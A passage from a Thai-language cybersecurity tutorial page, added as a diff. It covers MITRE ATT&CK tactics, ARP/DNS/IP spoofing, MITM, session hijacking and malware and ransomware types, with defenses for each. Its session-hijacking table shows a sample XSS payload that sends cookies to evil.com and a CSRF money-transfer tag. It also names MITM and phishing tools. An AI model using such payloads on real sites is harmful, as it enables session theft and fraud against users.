+    <tr><td>6</td><td><strong>Privilege Escalation</strong></td><td>ยกระดับสิทธิ์เป็น Admin/Root</td><td>T1548 — Abuse Elevation Control Mechanism, T1068 — Exploitation</td></tr>
+    <tr><td>7</td><td><strong>Defense Evasion</strong></td><td>หลบเลี่ยงการตรวจจับ</td><td>T1562 — Impair Defenses, T1027 — Obfuscated Files or Info</td></tr>
+    <tr><td>8</td><td><strong>Credential Access</strong></td><td>ขโมย Username/Password</td><td>T1555 — Credentials from Password Stores, T1003 — OS Credential Dumping</td></tr>
+    <tr><td>9</td><td><strong>Discovery</strong></td><td>สำรวจระบบ — รู้ว่ามีอะไรบ้าง</td><td>T1082 — System Information Discovery, T1016 — Network Info Discovery</td></tr>
+    <tr><td>10</td><td><strong>Lateral Movement</strong></td><td>เคลื่อนที่จากเครื่องหนึ่งไปอีกเครื่อง</td><td>T1021 — Remote Services (RDP, SSH), T1550 — Use Alternate Auth</td></tr>
+    <tr><td>11</td><td><strong>Collection</strong></td><td>รวบรวมข้อมูลก่อนขโมย</td><td>T1005 — Data from Local System, T1074 — Data Staged</td></tr>
+    <tr><td>12</td><td><strong>Command and Control (C2)</strong></td><td>สร้างช่องทางควบคุมระยะไกล</td><td>T1071 — Application Layer Protocol, T1090 — Proxy, T1572 — Protocol Tunneling</td></tr>
+    <tr><td>13</td><td><strong>Exfiltration</strong></td><td>ขโมยข้อมูลออกจากเครือข่าย</td><td>T1048 — Exfiltration Over Alternative Protocol, T1567 — Exfiltration Over Web Service</td></tr>
+    <tr><td>14</td><td><strong>Impact</strong></td><td>ทำลายระบบหรือข้อมูล</td><td>T1486 — Data Encrypted for Impact (Ransomware), T1499 — Endpoint DoS</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>การนำ ATT&CK ไปใช้ในองค์กร:</strong></p>
+<ul>
+  <li><strong>Threat Intelligence</strong>: Mapping IOCs และรายงานภัยคุกคามเข้ากับ ATT&CK Techniques</li>
+  <li><strong>SOC Alert Prioritization</strong>: ระบุว่า Technique ใดเป็นอันตรายที่สุด</li>
+  <li><strong>Red/Blue Team Assessment</strong>: วัดความครอบคลุมของ Detection/Prevention</li>
+  <li><strong>Control Gap Analysis</strong>: วิเคราะห์ว่ามาตรการป้องกันที่มีครอบคลุม Technique ใดบ้าง</li>
+</ul>
+
+<h3 id="section4-5" class="section-ref">4.5 เปรียบเทียบ Frameworks</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Framework</th><th>จุดเด่น</th><th>จุดด้อย</th><th>เหมาะกับ</th></tr></thead>
+  <tbody>
+    <tr><td><strong>STRIDE</strong></td><td>จำแนกประเภทภัยคุกคามได้ชัดเจน, ใช้ง่าย</td><td>ไม่ได้จัดลำดับความเสี่ยง</td><td>การออกแบบระบบใหม่ (Design Phase)</td></tr>
+    <tr><td><strong>DREAD</strong></td><td>ให้คะแนนความเสี่ยงเป็นตัวเลข</td><td>Microsoft เลิกใช้แล้ว, ผลลัพธ์ไม่ stable</td><td>— (legacy)</td></tr>
+    <tr><td><strong>PASTA</strong></td><td>เชื่อม Business กับ Technical, 7 ขั้นตอนละเอียด</td><td>ใช้เวลานาน, ต้องมีทีมใหญ่</td><td>ระบบสำคัญ (Critical Systems)</td></tr>
+    <tr><td><strong>MITRE ATT&CK</strong></td><td>ใช้ข้อมูลจริง, มี Mitigation + Detection</td><td>ครอบคลุมเฉพาะหลัง Initial Access</td><td>SOC, Red Team, Threat Intel</td></tr>
+    <tr><td><strong>Cyber Kill Chain</strong></td><td>เข้าใจง่าย, เห็นภาพรวม</td><td>Linear เกินไป</td><td>การสื่อสารกับผู้บริหาร</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<!-- ====== SECTION 5: NETWORK LAYER ATTACKS ====== -->
+<section id="section5" class="section-ref">
+<h2>5. การโจมตีในชั้นเครือข่าย (Network Layer Attacks)</h2>
+
+<h3 id="section5-1" class="section-ref">5.1 <span class="glossary-term">ARP Spoofing<span class="tooltip">การโจมตีที่ผู้โจมตีส่ง ARP Reply ปลอมเพื่อให้ MAC Address ของผู้โจมตีถูกแมปกับ IP ของเครื่องอื่น — ใช้สำหรับ MITM ในเครือข่าย LAN</span></span> (ARP Poisoning)</h3>
+
+<p><strong>หลักการทำงาน:</strong></p>
+<p>ARP (Address Resolution Protocol) ใช้ในการแปลง IP Address เป็น MAC Address ในเครือข่าย Local Area Network (LAN) โดย Switch จะส่ง ARP Request แบบ Broadcast และเจ้าของ IP จะตอบกลับด้วย ARP Reply</p>
+
+<p>ARP Spoofing อาศัยจุดอ่อนที่ ARP Protocol ไม่มีการตรวจสอบความถูกต้อง — ผู้โจมตีส่ง ARP Reply ปลอมไปยังเครื่องเหยื่อหรือ Gateway เพื่อให้ MAC Address ของผู้โจมตีถูกแมปกับ IP Address ของเครื่องอื่น</p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>สถานะปกติ:                       หลังถูก ARP Spoofing:
+
+PC A ──── Switch ──── Gateway     PC A ──── Switch ──── Gateway
+  ↕                               ↕            ↕
+(ARP: 192.168.1.1 → MAC_GW)     (ARP: 192.168.1.1 → MAC_MITM)</pre>
+
+<p><strong>ผลกระทบ:</strong></p>
+<ul>
+  <li><strong>Man-in-the-Middle (MITM)</strong> — Traffic ทั้งหมดผ่านผู้โจมตีก่อนถึงปลายทาง — สามารถ Sniff, Modify, หรือ Drop Packets</li>
+  <li><strong>Denial of Service (DoS)</strong> — ส่ง ARP Reply ที่ผิดพลาด ทำให้เครื่องเหยื่อไม่สามารถติดต่อ Gateway ได้</li>
+  <li><strong>Session Hijacking</strong> — ขโมย Session Cookies หรือ Tokens ที่ส่งผ่าน HTTP (ไม่เข้ารหัส)</li>
+</ul>
+
+<p><strong>เครื่องมือที่ใช้:</strong></p>
+<ul>
+  <li><strong>Ettercap</strong> — เครื่องมือ MITM ที่มีฟังก์ชัน ARP Spoofing ในตัว, รองรับ Plugin มากมาย</li>
+  <li><strong>Bettercap</strong> — เครื่องมือสมัยใหม่ที่รองทั้ง 2.4GHz และ 5GHz Wi-Fi, มี HTTP/HTTPS Proxy</li>
+  <li><strong>Cain & Abel</strong> — Windows-based, แต่หยุดพัฒนาแล้ว</li>
+  <li><strong>arpspoof (dsniff)</strong> — CLI tool สำหรับ ARP Spoofing ใน Linux</li>
+</ul>
+
+<p><strong>การป้องกัน:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>มาตรการ</th><th>ระดับ</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Dynamic ARP Inspection (DAI)</strong></td><td>Switch</td><td>ตรวจสอบ ARP Packets เทียบกับ DHCP Snooping Binding Database — ปัจจุบันมีใน Managed Switch ทุกรุ่น</td></tr>
+    <tr><td><strong>Static ARP Entry</strong></td><td>Endpoint</td><td>กำหนด ARP Table แบบ Manual — เหมาะกับเครือข่ายเล็ก (Gateway + Servers)</td></tr>
+    <tr><td><strong>Port Security</strong></td><td>Switch</td><td>จำกัด MAC Address ต่อ Port — ป้องกันการต่อ Device เพิ่ม</td></tr>
+    <tr><td><strong>VLAN Segmentation</strong></td><td>Network</td><td>แยก Broadcast Domain — จำกัดขอบเขตของ ARP Spoofing</td></tr>
+    <tr><td><strong>Encryption (HTTPS/TLS/VPN)</strong></td><td>Application</td><td>แม้ Traffic ถูกดักจับ ข้อมูลก็ไม่สามารถอ่านได้</td></tr>
+    <tr><td><strong>DAI (DHCP Snooping + ARP Inspection)</strong></td><td>Switch</td><td>ตรวจสอบ ARP — Trusted Ports (Uplink) vs Untrusted Ports (Access)</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section5-2" class="section-ref">5.2 <span class="glossary-term">DNS Poisoning<span class="tooltip">การโจมตีที่ผู้โจมตีส่ง DNS Response ปลอมไปยัง DNS Resolver เพื่อให้บันทึกข้อมูล DNS ที่ผิดพลาดลง Cache — นำผู้ใช้ไปยังเว็บไซต์ปลอม</span></span> (DNS Cache Poisoning)</h3>
+
+<p><strong>หลักการทำงาน:</strong></p>
+<p>DNS Poisoning หรือ DNS Cache Poisoning คือการที่ผู้โจมตีส่ง DNS Response ปลอมไปยัง DNS Resolver (Recursive Resolver) เพื่อให้บันทึกข้อมูล DNS ที่ผิดพลาดลง Cache เมื่อผู้ใช้ Request Domain Name ที่ถูก Poison ไว้ ก็จะถูก Redirect ไปยัง IP Address ของผู้โจมตี</p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ปกติ:         ผู้ใช้ → DNS Resolver → Authoritative DNS → IP จริง
+ถูก Poison:   ผู้ใช้ → DNS Resolver (Cache ผิด) → IP ปลอม (ผู้โจมตี)</pre>
+
+<p><strong>เทคนิคการโจมตี DNS:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>เทคนิค</th><th>รายละเอียด</th><th>ความรุนแรง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>DNS Cache Poisoning (Classic)</strong></td><td>ส่ง DNS Response ปลอมพร้อม Transaction ID ที่เดาถูก</td><td>ปานกลาง — Transaction ID มี 16-bit (65,536 ค่า)</td></tr>
+    <tr><td><strong>DNS Pharming</strong></td><td>เปลี่ยน DNS Setting บน Router หรือ Device ของเหยื่อ</td><td>สูง — ต้องเข้าถึง Device ได้</td></tr>
+    <tr><td><strong>DNS Tunneling</strong></td><td>ใช้ DNS Queries/Responses เป็นช่องทาง C2 — ข้อมูลถูก Encoded ใน DNS Queries</td><td>ปานกลาง — Traffic ผิดปกติ</td></tr>
+    <tr><td><strong>DNS Amplification DDoS</strong></td><td>ใช้ Open DNS Resolver ส่ง Response ใหญ่ไปยัง Victim (Spoof Source IP)</td><td>สูงมาก — Amplification Factor สูงถึง 50x</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>การป้องกัน DNS Poisoning:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>มาตรการ</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>DNSSEC (DNS Security Extensions)</strong></td><td>เพิ่ม Digital Signature ใน DNS Records — ตรวจสอบความถูกต้องของ Response — ป้องกัน Cache Poisoning ได้</td></tr>
+    <tr><td><strong>DNS over HTTPS (DoH) / DNS over TLS (DoT)</strong></td><td>เข้ารหัส DNS Query — ป้องกันการดักจับและแก้ไขระหว่างทาง</td></tr>
+    <tr><td><strong>Random Transaction ID + Port</strong></td><td>ระบบปฏิบัติการสมัยใหม่ใช้ Source Port แบบสุ่ม — ทำให้การโจมตีแบบ Poison Cache ทำได้ยากขึ้น</td></tr>
+    <tr><td><strong>กำหนด TTL ที่เหมาะสม</strong></td><td>TTL สั้น = Cache Poisoning มีผลระยะเวลาสั้นลง</td></tr>
+    <tr><td><strong>Use Trusted DNS Resolvers</strong></td><td>ใช้ DNS Provider ที่มี Security ในตัว (Cloudflare 1.1.1.1, Google 8.8.8.8, Quad9 9.9.9.9)</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section5-3" class="section-ref">5.3 IP Spoofing</h3>
+
+<p><strong>หลักการทำงาน:</strong></p>
+<p>IP Spoofing คือการที่ผู้โจมตีปลอมแปลง Source IP Address ใน IP Packet Header เพื่อให้ Packet นั้นดูเหมือนว่ามาจากแหล่งที่เชื่อถือได้ หรือจากแหล่งที่ตรวจสอบยาก</p>
+
+<p><strong>ข้อจำกัด:</strong> ผู้โจมตีไม่สามารถรับ Response ได้ (One-Way Communication) — เพราะ Response จะถูกส่งไปยัง IP ที่ปลอมมา ดังนั้น IP Spoofing จึงเหมาะกับ:</p>
+<ul>
+  <li><strong>DDoS Amplification/Reflection</strong> — ส่ง Request โดยใช้ Source IP = Victim → Response ไปที่ Victim</li>
+  <li><strong>Blind Attack</strong> — ผู้โจมตีไม่สนใจ Response (เช่น SYN Flood)</li>
+</ul>
+
+<p><strong>การป้องกันตามมาตรฐาน BCP 38 (RFC 2827):</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>มาตรการ</th><th>ระดับ</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Ingress Filtering</strong></td><td>Router/ISP</td><td>ตรวจสอบ Traffic ขาเข้า — ถ้า Source IP มาจาก Network ที่ไม่ควรจะผ่านจุดนี้ → Drop</td></tr>
+    <tr><td><strong>Egress Filtering</strong></td><td>Firewall</td><td>ตรวจสอบ Traffic ขาออกจากองค์กร — Source IP ต้องเป็น IP ขององค์กรเท่านั้น</td></tr>
+    <tr><td><strong>Unicast RPF (uRPF)</strong></td><td>Router</td><td>ตรวจสอบ Routing Table — ถ้าไม่มี Route กลับไปยัง Source IP → Drop</td></tr>
+    <tr><td><strong>IPsec Authentication Header</strong></td><td>End-to-End</td><td>ใช้ Authentication ระดับ Network Layer — พิสูจน์ Source IP</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>ตัวอย่าง: DDoS Amplification ผ่าน IP Spoofing</strong></p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ผู้โจมตี → ส่ง DNS Query ปลอม (Source = Victim IP) → Open DNS Resolver
+                                                          ↓
+Open DNS Resolver → ส่ง DNS Response (ขนาดใหญ่) → Victim IP (ไม่ใช่ผู้โจมตี)</pre>
+
+<p><strong>BCP 38 (RFC 2827) — Best Current Practice:</strong> แนะนำให้ ISP ทุกรายทำ Ingress Filtering ที่ Customer Edge Router เพื่อปฏิเสธ Traffic ที่มี Source IP ไม่ตรงกับ Network Segment ของลูกค้า — แต่ปัจจุบัน ISP หลายรายยังไม่ได้ implement อย่างสมบูรณ์</p>
+
+<h3 id="section5-4" class="section-ref">5.4 การโจมตีแบบ Man-in-the-Middle (MITM)</h3>
+
+<p><strong>หลักการ:</strong></p>
+<p>การโจมตี MITM คือสถานการณ์ที่ผู้โจมตีแทรกตัวอยู่ระหว่างผู้ส่งและผู้รับ (Alice และ Bob) โดยทั้งสองฝ่ายไม่รู้ตัว ผู้โจมตีสามารถ:</p>
+<ul>
+  <li><strong>Eavesdropping</strong> — ดักฟังข้อมูล (อ่านแต่ไม่แก้ไข)</li>
+  <li><strong>Modification</strong> — ดัดแปลงข้อมูลก่อนส่งต่อ</li>
+  <li><strong>Impersonation</strong> — แอบอ้างตัวตนเป็นอีกฝ่าย</li>
+</ul>
+
+<p><strong>วิธีการโจมตี MITM ที่สำคัญ:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>วิธีการ</th><th>รายละเอียด</th><th>การป้องกัน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>ARP Spoofing</strong></td><td>หลอก Switch ให้ส่ง Traffic มาที่ผู้โจมตี (LAN)</td><td>DAI, Port Security, Static ARP</td></tr>
+    <tr><td><strong>DNS Spoofing</strong></td><td>ส่ง DNS Response ปลอม — Redirect ผู้ใช้</td><td>DNSSEC, DoH/DoT</td></tr>
+    <tr><td><strong>SSL Stripping</strong></td><td>Downgrade HTTPS → HTTP — ผู้ใช้เห็น HTTPS ใน URL bar แต่จริงๆ เป็น HTTP</td><td>HSTS Preloading, HTTP → HTTPS Redirect</td></tr>
+    <tr><td><strong>Rogue Access Point</strong></td><td>ตั้ง Access Point ปลอมที่มี SSID เดียวกัน</td><td>802.1X, WPA3-Enterprise, Certificate Pinning</td></tr>
+    <tr><td><strong>Session Hijacking</strong></td><td>ขโมย Session Cookie หลัง Authentication</td><td>Secure + HttpOnly Cookies, SameSite=Lax/Strict</td></tr>
+    <tr><td><strong>mTLS Proxy</strong></td><td>Proxy Certificate (Corporate SSL Inspection)</td><td>Certificate Pinning, Public Key Pinning (HPKP) — ใช้ด้วยความระมัดระวัง</td></tr>
+    <tr><td><strong>Evil Twin Wi-Fi</strong></td><td>AP ปลอมที่มี SSID ซ้ำกับ AP จริง — หลอกให้ Client เชื่อมต่อ</td><td>WPA3-Enterprise, ตรวจสอบ Certificate</td></tr>
+    <tr><td><strong>Proxy Attack</strong></td><td>ผู้โจมตีตั้ง Proxy Server และ Config Browser ให้ใช้</td><td>PAC File Security, WPAD Hardening</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>เครื่องมือสำหรับ MITM Attack:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>เครื่องมือ</th><th>คุณสมบัติเด่น</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Bettercap</strong></td><td>รองรับ HTTP/HTTPS/DNS MITM, 802.11 (Wi-Fi), BLE (Bluetooth Low Energy) — ครบเครื่องที่สุดในปัจจุบัน</td></tr>
+    <tr><td><strong>Ettercap</strong></td><td>ARP Spoofing, Content Filtering, Password Sniffing — Classic Tool</td></tr>
+    <tr><td><strong>mitmproxy</strong></td><td>HTTPS Proxy สำหรับวิเคราะห์ Traffic — ใช้ในการทดสอบความปลอดภัยของ Web App</td></tr>
+    <tr><td><strong>Responder</strong></td><td>LLMNR/NBT-NS/mDNS Poisoning — ขโมย Credentials ในเครือข่าย Windows</td></tr>
+    <tr><td><strong>Evilginx2</strong></td><td>Reverse Proxy สำหรับ Phishing — ขโมย Session Cookies แบบ Real-Time (Bypass MFA)</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>การป้องกัน MITM อย่างครบวงจร:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ชั้น</th><th>มาตรการ</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Network</strong></td><td>DAI (Dynamic ARP Inspection), DHCP Snooping, Port Security, 802.1X</td></tr>
+    <tr><td><strong>Transport</strong></td><td>TLS 1.3, HSTS (HTTP Strict Transport Security), Certificate Pinning</td></tr>
+    <tr><td><strong>Application</strong></td><td>Secure + HttpOnly Cookies, SameSite Cookies, CSP (Content Security Policy)</td></tr>
+    <tr><td><strong>Authentication</strong></td><td>MFA — โดยเฉพาะ FIDO2/WebAuthn ที่ทนต่อ Phishing</td></tr>
+    <tr><td><strong>User Awareness</strong></td><td>ตรวจสอบ URL, Certificate, ไม่คลิกลิงก์ต้องสงสัย</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section5-5" class="section-ref">5.5 Session Hijacking</h3>
+
+<p><strong>หลักการ:</strong></p>
+<p>Session Hijacking คือการที่ผู้โจมตีขโมย Session Identifier (Session Token, Session ID, Cookie) ของเหยื่อที่ผ่าน Authentication แล้ว เพื่อใช้เข้าถึงระบบโดยไม่ต้อง Login</p>
+
+<p><strong>วิธีการขโมย Session:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>วิธีการ</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Session Side-Jacking</strong></td><td>ดักจับ Session Cookie ที่ส่งผ่าน HTTP ไม่เข้ารหัส</td><td>Sniff Traffic ผ่าน Wi-Fi สาธารณะ</td></tr>
+    <tr><td><strong>Cross-Site Scripting (XSS)</strong></td><td>รัน JavaScript เพื่ออ่าน Document.cookie</td><td><code>&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code></td></tr>
+    <tr><td><strong>CSRF (Session Riding)</strong></td><td>ใช้ Session ที่มีอยู่เพื่อส่ง Request โดยไม่ยินยอม</td><td><code>&lt;img src="bank.com/transfer?to=attacker&amp;amount=10000"&gt;</code></td></tr>
+    <tr><td><strong>Session Fixation</strong></td><td>บังคับให้เหยื่อใช้ Session ID ที่ผู้โจมตีรู้</td><td>ส่ง Link ที่มี Session ID กำหนดไว้ล่วงหน้า</td></tr>
+    <tr><td><strong>Token Theft via Malware</strong></td><td>ขโมย Token File หรือ Registry</td><td>ขโมย OAuth Token จาก Local Storage</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>มาตรการป้องกัน Session Hijacking:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>มาตรการ</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><strong>HttpOnly Cookie</strong></td><td>JavaScript ไม่สามารถอ่าน Cookie ได้ — ป้องกัน XSS-based Session Theft</td></tr>
+    <tr><td><strong>Secure Cookie</strong></td><td>Cookie ถูกส่งผ่าน HTTPS เท่านั้น</td></tr>
+    <tr><td><strong>SameSite Cookie</strong></td><td>Lax = ป้องกัน CSRF (Cross-Site Request Forgery) บางส่วน; Strict = ป้องกันทั้งหมด</td></tr>
+    <tr><td><strong>Session Timeout</strong></td><td>กำหนดอายุ Session (15-30 นาที Idle Timeout)</td></tr>
+    <tr><td><strong>IP/Device Binding</strong></td><td>ผูก Session กับ IP Address หรือ Device Fingerprint</td></tr>
+    <tr><td><strong>Token Rotation</strong></td><td>สร้าง Token ใหม่ทุกครั้งที่ใช้ — Token เก่าถูกยกเลิก</td></tr>
+    <tr><td><strong>MFA Re-authentication</strong></td><td>สอบถาม MFA อีกครั้งเมื่อทำ Transaction สำคัญ</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<!-- ====== SECTION 6: MALWARE AND RANSOMWARE ====== -->
+<section id="section6" class="section-ref">
+<h2>6. <span class="glossary-term">Malware<span class="tooltip">Malicious Software — ซอฟต์แวร์ที่ถูกออกแบบมาเพื่อก่อให้เกิดความเสียหาย แทรกซึม หรือขโมยข้อมูลจากระบบคอมพิวเตอร์</span></span> และ Ransomware Ecosystem</h2>
+
+<h3 id="section6-1" class="section-ref">6.1 การจำแนกประเภทของ Malware</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>ลักษณะสำคัญ</th><th>การแพร่กระจาย</th><th>Dwell Time</th><th>ตัวอย่างในประวัติศาสตร์</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Virus</strong></td><td>แนบตัวเองกับไฟล์ — ต้องอาศัยการเปิดไฟล์เพื่อทำงาน</td><td>ไฟล์ที่ติดเชื้อ, USB</td><td>ระยะสั้น</td><td>CIH (Chernobyl), Melissa, ILOVEYOU</td></tr>
+    <tr><td><strong>Worm</strong></td><td>แพร่กระจายตัวเองผ่านเครือข่าย — ไม่ต้องมีไฟล์โฮสต์</td><td>Network Vulnerability, Email</td><td>ระยะสั้น (แพร่เร็วมาก)</td><td>Conficker, Morris, WannaCry (worm + ransomware)</td></tr>
+    <tr><td><strong>Trojan</strong></td><td>ปลอมตัวเป็นซอฟต์แวร์ปกติ — ผู้ใช้ Download เอง</td><td>การหลอกให้ Download</td><td>ขึ้นอยู่กับเป้าหมาย</td><td>Emotet, Zeus, QakBot</td></tr>
+    <tr><td><strong>Ransomware</strong></td><td>เข้ารหัสไฟล์ + เรียกค่าไถ่ — มีทั้ง Encryptor และ Locker</td><td>Email, RDP, Vulnerability, Drive-By</td><td>จากชั่วโมงถึงวัน</td><td>WannaCry, LockBit, BlackCat, DarkSide</td></tr>
+    <tr><td><strong><span class="glossary-term">Botnet<span class="tooltip">เครือข่ายของเครื่องคอมพิวเตอร์ที่ถูกควบคุมจากระยะไกล — ใช้โจมตี DDoS, ส่ง Spam, หรือขุด Crypto โดยที่เจ้าของไม่รู้ตัว</span></span></strong></td><td>ควบคุมเครื่องเหยื่อระยะไกล — ใช้โจมตี DDoS หรือส่ง Spam</td><td>Worm, Trojan, Exploit</td><td>ระยะยาว</td><td>Mirai, Emotet, TrickBot</td></tr>
+    <tr><td><strong>Rootkit</strong></td><td>ซ่อนตัวใน OS — แก้ไข Kernel หรือ Boot Process</td><td>Exploit, Trojan</td><td>ระยะยาวมาก</td><td>Sony Rootkit (2005), ZeroAccess</td></tr>
+    <tr><td><strong>Spyware</strong></td><td>จารกรรมข้อมูล — บันทึกการใช้งาน, ถ่ายภาพ, อัดเสียง</td><td>Bundle กับ Freeware, Drive-By</td><td>ระยะยาว</td><td>Pegasus (NSO Group), FinFisher</td></tr>
+    <tr><td><strong>Keylogger</strong></td><td>บันทึกการพิมพ์ — ขโมย Password, Credit Card</td><td>Trojan, Drive-By Download</td><td>ระยะสั้น-กลาง</td><td></td></tr>
+    <tr><td><strong>Fileless Malware</strong></td><td>ทำงานใน Memory — ไม่มีไฟล์บน Disk — ตรวจจับยากมาก</td><td>PowerShell, WMI, Macros</td><td>สั้น (ไม่มีร่องรอย)</td><td>Kovter, Astaroth</td></tr>
+    <tr><td><strong>Adware</strong></td><td>แสดงโฆษณา — สร้างรายได้จากผู้ใช้</td><td>Bundle กับ Freeware</td><td>ระยะยาว</td><td></td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section6-2" class="section-ref">6.2 วงจรชีวิตของ Malware (Malware Lifecycle)</h3>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>1. Delivery ──→ 2. Installation ──→ 3. Execution ──→ 4. Persistence ──→ 5. C2 ──→ 6. Action
+    │                  │                 │                │              │          │
+    ▼                  ▼                 ▼                ▼              ▼          ▼
+  Phishing          Exploit          Decode /        Registry       DNS/Tor    Encrypt
+  USB Drop       Social Eng.       Deobfuscate    Scheduled Task   HTTPS      Exfiltrate
+  Drive-By                            Load Payload   Service        P2P        Destroy</pre>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ขั้นตอน</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>1. Delivery</strong></td><td>ส่ง Malware ไปยังเหยื่อ</td><td>Email Attachment (Phishing), USB Drop, Drive-By Download, Watering Hole</td></tr>
+    <tr><td><strong>2. Installation</strong></td><td>ติดตั้งในระบบ — ใช้ Exploit หรือ Social Engineering</td><td>CVE Exploit, User Double-Click, Macro Execution</td></tr>
+    <tr><td><strong>3. Execution</strong></td><td>ทำงานตามวัตถุประสงค์</td><td>PowerShell Script, DLL Injection, Shellcode Execution</td></tr>
+    <tr><td><strong>4. Persistence</strong></td><td>ทำให้ Malware สามารถอยู่รอดได้แม้จะมีการ Restart ระบบ</td><td>Registry Run Key, Scheduled Task, Windows Service</td></tr>
+    <tr><td><strong>5. Command & Control (C2)</strong></td><td>ติดต่อกับเซิร์ฟเวอร์ควบคุม</td><td>DNS Beaconing (Mirai), HTTPS C2 (Cobalt Strike), DGA (SolarWinds)</td></tr>
+    <tr><td><strong>6. Actions on Objectives</strong></td><td>ดำเนินการตามเป้าหมาย</td><td>Keylogging, สแกนเครือข่าย, เรียกค่าไถ่, ขโมยข้อมูล</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section6-3" class="section-ref">6.3 Malware Delivery Mechanisms (วิธีการส่ง Malware)</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>วิธีการ</th><th>คำอธิบาย</th><th>สัดส่วนการใช้งาน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Phishing Email</strong></td><td>ส่งอีเมลพร้อม Attachment Malicious หรือ Link ไปยัง Fake Login Page</td><td>~60% (ENISA 2025)</td></tr>
+    <tr><td><strong>Drive-By Download</strong></td><td>ผู้ใช้เข้าเว็บไซต์ที่มี Exploit Kit — Malware ถูก Download โดยอัตโนมัติ</td><td>~15%</td></tr>
+    <tr><td><strong>Malicious USB</strong></td><td>ทิ้ง USB Drive ที่ติด Malware ไว้ในที่จอดรถ / หน้าองค์กร</td><td>~3%</td></tr>
+    <tr><td><strong>Watering Hole</strong></td><td>แทรก Malware ในเว็บไซต์ที่เป้าหมายเข้าเป็นประจำ</td><td>&lt;1% (Targeted Attack)</td></tr>
+    <tr><td><strong>Supply Chain</strong></td><td>แทรก Malware ใน Software Update หรือ Library</td><td>&lt;1% แต่รุนแรงที่สุด (SolarWinds 18,000 ราย)</td></tr>
+    <tr><td><strong>RDP/VPN Brute-Force</strong></td><td>แฮก Remote Access Services</td><td>~15% (สำหรับ Ransomware)</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section6-4" class="section-ref">6.4 <span class="glossary-term">Ransomware<span class="tooltip">มัลแวร์เรียกค่าไถ่ — Malware ที่เข้ารหัสข้อมูลของเหยื่อและเรียกร้องเงินเพื่อถอดรหัส ปัจจุบันมีรูปแบบ Double/Triple Extortion และ RaaS</span></span> Ecosystem (เจาะลึก)</h3>
+
+<p>Ransomware เป็นภัยคุกคามที่ร้ายแรงที่สุดในปัจจุบัน:</p>
+
+<p><strong>ประเภทของ Ransomware:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Encryptor (Crypto Ransomware)</strong></td><td>เข้ารหัสไฟล์ — ต้องใช้ Key ในการถอดรหัส</td><td>LockBit, BlackCat, DarkSide</td></tr>
+    <tr><td><strong>Locker Ransomware</strong></td><td>ล็อกหน้าจอ — ไม่ให้เข้า OS (ไม่ได้เข้ารหัสไฟล์)</td><td>WinLocker, FBI MoneyPak</td></tr>
+    <tr><td><strong>Double Extortion</strong></td><td>เข้ารหัสไฟล์ + <strong>ขโมยข้อมูล</strong> — ถ้าไม่จ่ายจะเผยแพร่ข้อมูลสู่สาธารณะ</td><td>DarkSide, REvil, Clop</td></tr>
+    <tr><td><strong>Triple Extortion</strong></td><td>Double Extortion + <strong>DDoS</strong> หรือแจ้งลูกค้า/คู่ค้า</td><td>Maze, REvil</td></tr>
+    <tr><td><strong>Ransomware-as-a-Service (RaaS)</strong></td><td>แพลตฟอร์มที่ให้ Affiliate เช่าใช้</td><td>LockBit, BlackCat (ALPHV), REvil</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>Ransomware Attack Timeline (ทั่วไป):</strong></p>
+
